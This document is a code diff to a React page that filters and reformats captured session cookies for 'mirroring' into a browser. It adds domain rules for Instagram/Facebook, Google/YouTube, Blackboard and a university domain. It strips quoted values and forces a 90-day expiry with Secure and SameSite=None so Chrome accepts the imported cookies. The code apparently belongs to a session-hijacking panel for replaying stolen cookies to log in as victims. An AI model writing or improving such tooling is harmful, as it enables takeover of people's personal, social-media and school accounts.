@@ -235,18 +235,21 @@ export default function SessionsPage() {
     const info = accountMap[selectedSession.id];
     const targetDomain = info?.domain.toLowerCase() || "";
     
-    // DEEP MIRROR FILTER: Target + Auth Parents
+    // DEEP MIRROR FILTER: Target + Linked Auth Domains
     const filteredCookies = cookies.filter(c => {
       const d = c.domain.toLowerCase();
       const n = c.name;
       
-      // Blacklist known tracking noise that blocks imports
-      const blacklist = ["fr", "tr", "_fbp", "ar_debug", "_ga", "_gid", "ps_l", "ps_n"];
+      // Blacklist noise cookies known to cause import errors
+      const blacklist = ["fr", "tr", "_fbp", "ar_debug", "_ga", "_gid", "test_cookie", "ps_l", "ps_n"];
       if (blacklist.some(b => b === n)) return false;
 
-      // Inclusive check for Instagram/Facebook complex
+      // Platform-specific link rules
       if (targetDomain.includes("instagram")) {
           return d.includes("instagram.com") || d.includes("facebook.com");
+      }
+      if (targetDomain.includes("google") || targetDomain.includes("youtube") || targetDomain.includes("blackboard")) {
+          return d.includes("google.com") || d.includes("youtube.com") || d.includes("blackboard.com") || d.includes("up.edu.pe");
       }
       return d.includes(targetDomain);
     });
@@ -255,6 +258,16 @@ export default function SessionsPage() {
       const isHost = c.name.startsWith("__Host-");
       const farFuture = Math.floor(Date.now() / 1000) + 86400 * 90;
 
+      // VALUE SANITIZER: Strip literal escaped quotes that break cookies
+      let rawValue = c.value || "";
+      if (rawValue.startsWith('"') && rawValue.endsWith('"')) {
+        rawValue = rawValue.substring(1, rawValue.length - 1);
+      }
+      // Also handle escaped quotes like \"
+      if (rawValue.startsWith('\"') && rawValue.endsWith('\"')) {
+        rawValue = rawValue.substring(2, rawValue.length - 2);
+      }
+
       return {
         domain: isHost ? "" : (c.domain.startsWith('.') ? c.domain : '.' + c.domain),
         expirationDate: farFuture,
@@ -262,13 +275,12 @@ export default function SessionsPage() {
         httpOnly: c.http_only,
         name: c.name,
         path: isHost ? "/" : (c.path || "/"),
-        // THE MAGIC FIX: Modern Chrome requires Secure=true to accept SameSite=None (no_restriction)
-        // If we don't force BOTH, the mirror is rejected silently.
+        // ABSOLUTE COMPATIBILITY: Secure=true + SameSite=None is mandatory for Mirroring
         sameSite: "no_restriction", 
         secure: true, 
         session: false,
         storeId: c.store_id || "0",
-        value: c.value
+        value: rawValue
       };
     });
     
